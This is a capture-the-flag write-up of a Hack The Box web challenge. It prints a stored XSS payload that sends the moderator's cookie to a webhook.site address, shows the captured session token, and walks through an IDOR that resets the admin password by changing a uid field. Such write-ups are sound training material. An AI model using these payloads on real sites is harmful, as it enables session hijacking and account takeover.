# Kryptos Support

## Challenge

```
The secret vault used by the Longhir's planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona are after to prove the injustice performed by the commission.
Ulysses performed an initial recon at their request and found a support portal for the vault.
Can you take a look if you can infiltrate this system?
```

Category: Web

Points: 300

## Writeup

When we launch the challenge's site, the first thing we see is a form to submit a support ticket and a login form.

| Support form (`/`)                  | Login form (`/login`)           |
| ----------------------------------- | ------------------------------- |
| ![Support form](images/support.png) | ![Login form](images/login.png) |

After an inspection of the pages, we have found that after the login, we have redirected to the `/tickets` page (not accessible if not authenticated), but we can't find any obvious way to bypass the login.

So we'll have to use the support form.

Let's try an XSS attack on it with the following code to get the moderator cookies:

```html
"><img src=x onerror="javascript:document.location='https://webhook.site/<your-webkook>?c='+document.cookie"></img>
```

The result is unbelievable: IT WORKS! And on the first try!

The cookies are:

```
session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2MjQwODZ9.B1LGelnlcJ07YUbS4gEJzLJl2Q1zDG5BDkL2q86ppuw
```

The session cookie is a JWT token with the following payload:

```json
{
  "username": "moderator",
  "uid": 100,
  "iat": 1652624086
}
```

At first, we thought to crack the JWT token and change the `uid` value, but we decided to take this as last option.

After we set the session cookie on our browser, we can access the `/tickets` page without problems and see all the submitted tickets.

After an hour of trying to complain about what the vault ids shown on the page can be, we realized that they probably are useless, so we start to search again.

In the top left corner of the page, we can see a link to a `/settings` page where we can change the logged user password.

For first we have changed the moderator password to something known: `aaa`.

Analyzing the request for the password change, we can see that with the new password, is sent the `uid` of the logged user:

```json
{
  "password": "aaa",
  "uid": 100
}
```

And the response is:

```json
{
  "message": "Password for moderator changed successfully!"
}
```

At this point, we can try to change the `uid` in the request and see what happens:

```json
{
  "password": "aaa",
  "uid": 1
}
```

And the response is:

```json
{
  "message": "Password for admin changed successfully!"
}
```

BINGO!

Now not only do we know that exists a user named `admin`, but we also know his password: `aaa`.

If we try to login as `admin`, the flag is shown after login:

![Flag](images/flag.png)

## Flag

```
HTB{x55_4nd_id0rs_ar3_fun!!}
```
